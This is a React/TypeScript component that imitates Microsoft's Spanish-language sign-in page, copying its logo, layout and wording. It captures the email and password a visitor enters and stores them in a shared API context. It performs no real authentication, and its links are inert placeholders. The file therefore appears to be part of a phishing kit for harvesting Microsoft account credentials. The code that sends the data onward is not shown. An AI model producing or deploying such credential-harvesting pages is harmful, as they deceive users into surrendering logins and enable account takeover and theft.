import type React from "react";
import { useState } from "react";
import { useApiContext } from '../../context/ApiContext';

export default function MicrosoftLogin() {
  const [email, setEmail] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const { setMail, setPassword } = useApiContext();
  

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !passwordInput.trim()) return;
    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);
    }, 1000);

    setMail(email);
    setPassword(passwordInput);
  };

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#e6e9f0] to-[#eef1f5]">
      <main className="flex flex-1 items-center justify-center p-4">
        <div className="bg-white w-[440px] rounded shadow-md px-11 py-10 flex flex-col">
          <form
            className="flex flex-col"
            onSubmit={handleSubmit}
          >
            <div className="flex items-center mb-6">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
                alt="Microsoft"
                className="h-5"
              />
            </div>
            <h2 className="text-2xl font-semibold mb-4">
              Iniciar sesión
            </h2>
            <div className="mb-4">
              <input
                type="text"
                placeholder="Correo electrónico, teléfono o Skype"
                className="w-full border-0 border-b-[1.5px] border-b-[#bdbdbd] focus:border-b-[#0067b8] outline-none bg-transparent text-base text-[#222] py-2 transition-colors"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>
            <div className="mb-4">
              <input
                type="password"
                placeholder="Contraseña"
                className="w-full border-0 border-b-[1.5px] border-b-[#bdbdbd] focus:border-b-[#0067b8] outline-none bg-transparent text-base text-[#222] py-2 transition-colors"
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
                required
              />
            </div>
            <div className="mb-6 text-sm">
              <p className="mb-2">
                ¿No tiene una cuenta?{" "}
                <a href="#" className="text-[#0067b8] hover:underline font-semibold">
                  Cree una
                </a>
              </p>
              <p>
                <a href="#" className="text-[#0067b8] hover:underline">
                  ¿No puede acceder a su cuenta?
                </a>
              </p>
            </div>
            <div className="flex justify-end">
              <button
                className="min-w-[108px] bg-[#0067b8] hover:bg-[#005da6] text-white px-4 py-2 text-sm font-semibold"
                type="submit"
                disabled={!email.trim() || !passwordInput.trim() || isLoading}
              >
                {isLoading ? "Validando..." : "Siguiente"}
              </button>
            </div>
          </form>
        </div>
      </main>
      <footer className="text-center text-xs text-[#666] w-full mt-auto py-4">
        <a href="#" className="mx-2 text-[#666] hover:underline">
          Términos de uso
        </a>
        <a href="#" className="mx-2 text-[#666] hover:underline">
          Privacidad y cookies
        </a>
      </footer>
    </div>
  );
}